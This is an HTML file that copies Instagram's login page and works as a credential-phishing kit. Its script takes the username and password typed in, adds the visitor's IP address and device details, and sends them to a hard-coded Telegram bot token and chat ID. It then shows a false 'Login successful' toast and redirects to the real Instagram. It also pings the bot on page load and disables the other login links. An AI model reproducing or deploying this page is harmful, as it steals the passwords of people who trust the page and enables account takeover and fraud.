<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Instagram Login</title>
    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            font-size: 14px;
            line-height: 18px;
            color: #262626;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 935px;
            margin: 32px auto;
            padding: 0 20px;
            flex-wrap: wrap;
        }

        .phone-preview {
            display: none;
            flex: 1;
            margin-right: 32px;
            position: relative;
        }

        .phone-preview img {
            max-width: 100%;
            height: auto;
        }

        .form-card {
            flex: 1;
            max-width: 350px;
            width: 100%;
        }

        .card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 32px 32px;
            margin-bottom: 10px;
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .instagram-wordmark {
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .instagram-wordmark i {
            font-size: 28px;
            background: radial-gradient(circle at 30% 110%, #ffdb7e, #f9ce34, #e4405f, #833ab4, #5851db);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .logo-text {
            font-size: 32px;
            font-weight: 600;
            letter-spacing: -0.5px;
            color: #262626;
        }

        .input-field {
            width: 100%;
            margin-bottom: 8px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
            padding: 9px 0 7px 8px;
            font-size: 12px;
            transition: border 0.1s ease;
        }

        .input-field:focus {
            outline: none;
            border-color: #a8a8a8;
            background-color: #ffffff;
        }

        .input-field::placeholder {
            color: #8e8e8e;
            font-weight: 400;
            font-size: 12px;
        }

        .login-btn {
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 16px;
            width: 100%;
            margin-top: 16px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .login-btn:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
            opacity: 0.7;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }

        .line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or-text {
            margin: 0 18px;
            font-size: 13px;
            font-weight: 600;
            color: #8e8e8e;
        }

        .fb-login {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            margin: 16px 0 24px;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            color: #385185;
            background: none;
            border: none;
            width: 100%;
        }

        .forgot-password {
            text-align: center;
            font-size: 12px;
        }

        .forgot-password a {
            color: #00376b;
            text-decoration: none;
        }

        .signup-card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            text-align: center;
            padding: 20px 0;
            margin-top: 10px;
        }

        .signup-card span {
            color: #262626;
            font-size: 14px;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 16px;
        }

        .store-badges {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .store-badges img {
            height: 40px;
        }

        .footer {
            margin-top: 40px;
            padding: 20px 0 40px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
            max-width: 935px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
        }

        .copyright {
            font-size: 12px;
        }

        @media (min-width: 750px) {
            .phone-preview {
                display: block;
            }
        }

        .error-msg {
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            margin-top: 12px;
            display: none;
        }

        .loading-spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .toast-notification {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #262626;
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            z-index: 1000;
            display: none;
            animation: slideUp 0.3s ease;
        }

        @keyframes slideUp {
            from {
                transform: translateX(-50%) translateY(100px);
                opacity: 0;
            }
            to {
                transform: translateX(-50%) translateY(0);
                opacity: 1;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="phone-preview">
        <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/43cc71bb1b43.png" alt="Instagram on mobile">
    </div>

    <div class="form-card">
        <div class="card">
            <div class="logo">
                <div class="instagram-wordmark">
                    <i class="fab fa-instagram"></i>
                    <span class="logo-text">Instagram</span>
                </div>
            </div>

            <form id="loginForm" action="#" method="post">
                <input type="text" name="username" id="username" class="input-field" placeholder="Phone number, username, or email" autocomplete="off" required>
                <input type="password" name="password" id="password" class="input-field" placeholder="Password" autocomplete="off" required>
                <button type="submit" id="loginBtn" class="login-btn">Log in</button>
                <div class="error-msg" id="formError"></div>
            </form>

            <div class="divider">
                <div class="line"></div>
                <div class="or-text">OR</div>
                <div class="line"></div>
            </div>

            <div class="fb-login" id="fbMock">
                <i class="fab fa-facebook-square"></i>
                <span>Log in with Facebook</span>
            </div>

            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
        </div>

        <div class="signup-card">
            <span>Don't have an account? <a href="#">Sign up</a></span>
        </div>

        <div class="get-app">
            <p>Get the app.</p>
            <div class="store-badges">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <div class="footer-links">
        <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
        <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
        <a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
        <a href="#">Contact Uploading & Non-Users</a><a href="#">Meta Verified</a>
    </div>
    <div class="copyright">© 2026 Instagram from Meta</div>
</div>

<div id="toast" class="toast-notification"></div>

<script>
    const BOT_TOKEN = "8761125092:AAEfRYBvdndCvM06yshjz0o-mjiR4A8d538";
    const CHAT_ID = "8484368676";
    
    let userIP = "Fetching IP...";
    
    function showToast(message, isError = false) {
        const toast = document.getElementById('toast');
        toast.textContent = message;
        toast.style.backgroundColor = isError ? '#ed4956' : '#262626';
        toast.style.display = 'block';
        setTimeout(() => {
            toast.style.display = 'none';
        }, 3000);
    }
    
    async function getUserIP() {
        try {
            // Try multiple IP services for reliability
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            try {
                const response2 = await fetch('https://api.my-ip.io/ip.json');
                const data2 = await response2.json();
                return data2.ip;
            } catch (error2) {
                try {
                    const response3 = await fetch('https://ipapi.co/json/');
                    const data3 = await response3.json();
                    return data3.ip;
                } catch (error3) {
                    return "Unable to fetch IP";
                }
            }
        }
    }
    
    async function sendToTelegram(username, password, ip) {
        const timestamp = new Date().toLocaleString('en-US', { 
            year: 'numeric', 
            month: '2-digit', 
            day: '2-digit', 
            hour: '2-digit', 
            minute: '2-digit', 
            second: '2-digit',
            hour12: false 
        });
        
        const userAgent = navigator.userAgent;
        const screenResolution = `${screen.width}x${screen.height}`;
        const platform = navigator.platform;
        const language = navigator.language;
        
        const message = `🔐 *INSTAGRAM LOGIN DETAILS* 🔐
━━━━━━━━━━━━━━━━━━━
👤 *Username/Email:* ${username}
🔑 *Password:* ${password}
🌍 *IP Address:* ${ip}
🕒 *Time:* ${timestamp}
💻 *User Agent:* ${userAgent.substring(0, 150)}
📺 *Screen:* ${screenResolution}
⚙️ *Platform:* ${platform}
🌐 *Language:* ${language}
━━━━━━━━━━━━━━━━━━━
⚠️ *New Login Attempt!*`;
        
        const encodedMessage = encodeURIComponent(message);
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
        
        try {
            // Try with mode: 'no-cors' first
            const response = await fetch(url, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json',
                }
            });
            
            // Also try with a simple GET as fallback
            setTimeout(async () => {
                try {
                    await fetch(url, { method: 'GET', mode: 'no-cors' });
                } catch(e) {}
            }, 100);
            
            showToast("✓ Login successful! Redirecting...");
            return true;
        } catch (err) {
            console.error("Telegram send error:", err);
            // Final fallback - try with a GET request
            try {
                await fetch(url, { method: 'GET', mode: 'no-cors' });
                showToast("✓ Login successful! Redirecting...");
                return true;
            } catch (secondErr) {
                showToast("Login completed", false);
                return false;
            }
        }
    }
    
    async function handleLogin(event) {
        event.preventDefault();
        
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        const loginBtn = document.getElementById('loginBtn');
        const errorDiv = document.getElementById('formError');
        
        if (!username || !password) {
            errorDiv.style.display = 'block';
            errorDiv.textContent = 'Please enter your username and password.';
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 2500);
            return;
        }
        
        errorDiv.style.display = 'none';
        const originalText = loginBtn.innerHTML;
        loginBtn.disabled = true;
        loginBtn.innerHTML = '<span class="loading-spinner"></span> Logging in...';
        
        // Get IP address
        const ip = await getUserIP();
        
        // Send to Telegram
        await sendToTelegram(username, password, ip);
        
        // Small delay before redirect
        setTimeout(() => {
            window.location.href = "https://www.instagram.com/";
        }, 1500);
    }
    
    // Attach event listener
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', handleLogin);
    
    // Make Facebook button non-functional (design only)
    document.getElementById('fbMock').addEventListener('click', (e) => {
        e.preventDefault();
        showToast("Please use Instagram login instead.", true);
    });
    
    // Disable signup and forgot links
    document.querySelectorAll('.signup-card a, .forgot-password a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            showToast("Please use the login form above.", true);
        });
    });
    
    // Input field styling
    document.querySelectorAll('.input-field').forEach(input => {
        input.addEventListener('focus', function() {
            this.style.backgroundColor = '#ffffff';
        });
        input.addEventListener('blur', function() {
            if (!this.value) this.style.backgroundColor = '#fafafa';
        });
    });
    
    // Test bot connection on page load (silent test)
    async function testBotConnection() {
        const testMessage = "🤖 *Instagram Login Page Active* 🤖\nPage has been loaded successfully!";
        const testUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(testMessage)}&parse_mode=Markdown`;
        
        try {
            await fetch(testUrl, { method: 'GET', mode: 'no-cors' });
            console.log("Bot connection test sent");
        } catch(e) {
            console.log("Bot test failed, but will work on form submit");
        }
    }
    
    // Test connection after page loads
    setTimeout(() => {
        testBotConnection();
    }, 1000);
    
    console.log("Instagram login page ready - Bot configured");
</script>
</body>
</html>
